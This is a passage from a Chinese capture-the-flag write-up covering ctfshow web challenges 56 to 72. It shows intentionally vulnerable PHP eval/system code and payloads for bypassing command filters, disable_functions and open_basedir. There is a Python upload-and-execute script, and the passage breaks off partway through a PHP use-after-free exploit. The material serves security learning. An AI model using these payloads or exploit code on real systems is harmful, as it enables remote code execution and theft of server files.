class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://7a1fe05e-90db-4af3-a0ec-c849297f8d16.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url,files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span> :</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403163219886.png" alt="image-20220403163219886"></p><h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><h2 id="linux构造数字"><a href="#linux构造数字" class="headerlink" title="linux构造数字"></a>linux构造数字</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-08 01:02:56</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>要构造36这个数字</p><p>shell作用</p><ul><li>${_}:代表上一次命令执行的结果</li><li>$(()):做运算</li></ul><p>之前没有命令返回或者执行,结果应该是空,与<code>&quot;&quot;</code>等价又 <code>$((&quot;&quot;))</code>值为0,<code>$((~$((&quot;&quot;))))</code>值为-1,再做拼接:所以可以拼接得到-37 , -37取反得到36</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$((~$(($((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))))))</span><br></pre></td></tr></table></figure><h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><h2 id="绕过disable-fuctions"><a href="#绕过disable-fuctions" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: Lazzaro</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获取文件路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(dirname(&#x27;__FILE__&#x27;)));</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot;&quot;);&#125;</span><br><span class="line">c=$a=opendir(&quot;./&quot;);while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;;&#125;;</span><br></pre></td></tr></table></figure><p>读取文件</p><p>通过单一函数读取文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">c=readfile(&quot;flag.php&quot;);</span><br><span class="line">c=var_dump(file(&quot;flag.php&quot;));</span><br><span class="line">c=print_r(file(&#x27;flag.php&#x27;)); </span><br><span class="line">#file 把整个文件读到一个数组里</span><br></pre></td></tr></table></figure><p>通过fopen读取文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line"></span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line =fgets($a);echo $line;&#125;#一行一行读</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;#一个一个字符读取</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;</span><br></pre></td></tr></table></figure><p>通过高亮显示php文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(&quot;flag.php&quot;);</span><br><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><h1 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h1><h2 id="绕过disable-fuctions-1"><a href="#绕过disable-fuctions-1" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: Lazzaro</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查找flag文件的位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(&#x27;./&#x27;));</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//paylaod汇总</span><br><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br><span class="line">c=var_dump(file(&quot;flag.php&quot;)); </span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a);</span><br></pre></td></tr></table></figure><h1 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h1><h2 id="绕过disable-fuctions-2"><a href="#绕过disable-fuctions-2" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: Lazzaro</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查找</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(&#x27;./&#x27;));</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;</span><br><span class="line">不行的</span><br><span class="line">$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125; //php7.3版本后 该函数已不再被使用</span><br></pre></td></tr></table></figure><p>复制改名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制后访问url/flag.txt</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line"></span><br><span class="line">c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);</span><br><span class="line">c=rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</span><br></pre></td></tr></table></figure><h1 id="web61-65"><a href="#web61-65" class="headerlink" title="web61-65"></a>web61-65</h1><h2 id="绕过disable-fuctions-3"><a href="#绕过disable-fuctions-3" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><p>为了熟悉学习新姿势c&#x3D;$a&#x3D;opendir(‘.&#x2F;‘);while(($file &#x3D; readdir($a)) !&#x3D;false){echo $file.” “;}或者c&#x3D;print_r(scandir(current(localeconv())));</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//payload:</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">c=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><h1 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h1><h2 id="绕过disable-fuctions-4"><a href="#绕过disable-fuctions-4" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><p>扫描目录c&#x3D;var_dump(scandir(“&#x2F;“));发现是flag.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//下面是payload</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require_once(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h1 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h1><h2 id="绕过disable-fuctions-5"><a href="#绕过disable-fuctions-5" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><p>快乐第一步扫描目录c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//payload介绍</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require_once(&#x27;/flag.txt&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h1><h2 id="exit-使程序提前退出"><a href="#exit-使程序提前退出" class="headerlink" title="exit();使程序提前退出"></a>exit();使程序提前退出</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: Lazzaro</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><ul><li>ob_get_contents 返回输出缓冲区的内容</li><li>ob_end_clean 清空缓冲区并关闭输出缓冲区</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;system(&quot;ls&quot;);&#x27;;</span><br><span class="line">eval($a);</span><br><span class="line">//在网页中会输出内容</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;system(&quot;ls&quot;);&#x27;;</span><br><span class="line">eval($a);</span><br><span class="line">ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;system(&quot;ls&quot;);&#x27;;</span><br><span class="line">eval($a);</span><br><span class="line">$c = ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo $c;</span><br><span class="line">//在这里则在网页当中没有输出内容，不难看出其取得了缓冲区的内容并清空了缓冲区</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=require_once(&#x27;/flag.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><p>exit();使程序提前退出,绕过后面正则表达式</p><h1 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h1><h2 id="使用glob-x2F-x2F-伪协议绕过open-basedir"><a href="#使用glob-x2F-x2F-伪协议绕过open-basedir" class="headerlink" title="使用glob:&#x2F;&#x2F;伪协议绕过open_basedir"></a>使用glob:&#x2F;&#x2F;伪协议绕过open_basedir</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: Lazzaro</span></span><br><span class="line"><span class="comment">  Date:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>payload解释</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;?&gt;&lt;?php echo 111;?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#111</span></span><br></pre></td></tr></table></figure><p>这里的?&gt;是为了闭合前面的&lt;?php</p><p>看位置</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://./*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读文件没权限</p><h2 id="uaf绕过open-basedir执行命令"><a href="#uaf绕过open-basedir执行命令" class="headerlink" title="uaf绕过open_basedir执行命令"></a>uaf绕过open_basedir执行命令</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    